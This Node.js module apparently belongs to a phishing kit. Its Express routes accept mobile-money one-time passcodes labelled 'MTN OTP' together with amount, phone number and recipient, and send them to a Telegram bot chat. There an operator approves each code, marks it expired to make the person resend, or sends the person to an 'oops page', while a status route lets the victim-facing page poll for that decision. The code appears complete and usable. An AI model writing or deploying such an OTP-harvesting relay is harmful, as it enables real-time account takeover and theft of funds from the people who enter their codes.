// telegram-otp.js
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const pending = new Map();
const decisions = new Map(); // ref -> 'pending' | 'approved' | 'expired' | 'inactive'

function log(m) { console.log('[tg-otp]', m); }

async function sendMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram not configured.');
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}

async function answerCallback(cqId, text) {
  if (!BOT_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: cqId, text, show_alert: false })
  }).catch(() => {});
}

async function clearButtons(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(() => {});
}

async function handleUpdate(update) {
  const cq = update && update.callback_query;
  if (!cq) return;
  const data = cq.data || '';
  const [action, txRef] = data.split(':');
  if (!action || !action.startsWith('otp_') || !txRef) return;

  const target =
    action === 'otp_approve' ? 'approved' :
    action === 'otp_expired' ? 'expired'  :
                               'inactive';

  decisions.set(txRef, target);
  const entry = pending.get(txRef);
  if (entry) entry.decision = target;

  const messages = {
    approved: '✅ Approved — client continues.',
    expired:  '⏱ Code expired — client told to resend.',
    inactive: '⚠ Inactive — client sent to oops page.'
  };
  await answerCallback(cq.id, messages[target] || 'Done.');
  log(`otp tx ${txRef} → ${target}${entry ? '' : ' (recovered)'}`);

  const messageId = cq.message && cq.message.message_id;
  if (messageId) await clearButtons(messageId);
}

function registerRoutes(app) {
  app.post('/api/verification/submit', async (req, res) => {
    try {
      const { tx, otp, am, cur, c, an, rn } = req.body || {};
      if (!tx || !otp) return res.status(400).json({ error: 'Missing tx or otp' });

      const existing = pending.get(tx);
      if (existing && existing.decision === 'pending') {
        return res.json({ ok: true, requestId: tx });
      }

      pending.set(tx, { decision: 'pending', messageId: null });
      decisions.set(tx, 'pending');

      const safe = (v) => String(v == null ? '—' : v)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

      const text =
        `<b>🔐 New MTN OTP submitted</b>\n\n` +
        `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
        `<b>OTP:</b> <code>${safe(otp)}</code>\n` +
        `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
        `<b>Country:</b> ${safe(c)}\n` +
        `<b>Number:</b> ${safe(an)}\n` +
        `<b>Recipient:</b> ${safe(rn)}`;

      const keyboard = [[
        { text: '✅ Approve',     callback_data: `otp_approve:${tx}` },
        { text: '⏱ Code expired', callback_data: `otp_expired:${tx}` },
        { text: '⚠ Inactive',     callback_data: `otp_inactive:${tx}` }
      ]];

      const sent = await sendMessage(text, keyboard);
      const e = pending.get(tx);
      if (e) e.messageId = sent.message_id;

      log(`OTP submitted for ${tx}`);
      res.json({ ok: true, requestId: tx });
    } catch (err) {
      console.error('[tg-otp] send error', err);
      res.status(500).json({ error: 'Telegram send failed' });
    }
  });

  app.get('/api/verification/status/:ref', (req, res) => {
    const ref = req.params.ref;
    const live = pending.get(ref);
    if (live && live.decision !== 'pending') return res.json({ decision: live.decision });
    const stored = decisions.get(ref);
    if (stored) return res.json({ decision: stored });
    res.json({ decision: 'pending' });
  });

  app.post('/api/verification/otp', (req, res) => {
    const { tx, am, cur, c, an } = req.body || {};
    sendMessage(
      `<b>🔁 OTP resend requested</b>\n\n` +
      `<b>Reference:</b> <code>${String(tx || '—').replace(/&/g,'&amp;').replace(/</g,'&lt;')}</code>\n` +
      `<b>Amount:</b> ${String(cur || '')} ${String(am || '')}\n` +
      `<b>Country:</b> ${String(c || '—')}\n` +
      `<b>Number:</b> ${String(an || '—')}`,
      null
    ).catch(() => {});
    res.json({ ok: true });
  });

  log('Routes: /api/verification/submit, /api/verification/status/:ref, /api/verification/otp');
}

module.exports = { registerRoutes, handleUpdate };
